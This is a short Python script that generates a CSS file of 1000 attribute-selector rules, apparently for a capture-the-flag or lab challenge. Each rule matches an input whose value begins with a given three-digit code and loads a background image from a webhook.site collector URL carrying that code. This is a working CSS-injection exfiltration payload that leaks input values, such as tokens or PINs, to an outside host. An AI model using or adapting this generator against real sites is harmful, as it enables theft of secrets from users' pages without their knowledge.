WEBHOOK_URL = "https://webhook.site/e848b899-5716-4908-9088-7181eb90bb9c"

SELECTOR = "input[value]"

with open("part3.css", "w") as f:
    for i in range(1000):
        code = f"{i:03d}" # Format the number with leading zeros
        
        css_rule = (
            f'{SELECTOR}[value^="{code}"] {{\n'
            f'    background-image: url("{WEBHOOK_URL}?code={code}");\n'
            f'}}\n\n'
        )
        f.write(css_rule)
        
print("CSS file 'part3.css' generated successfully.")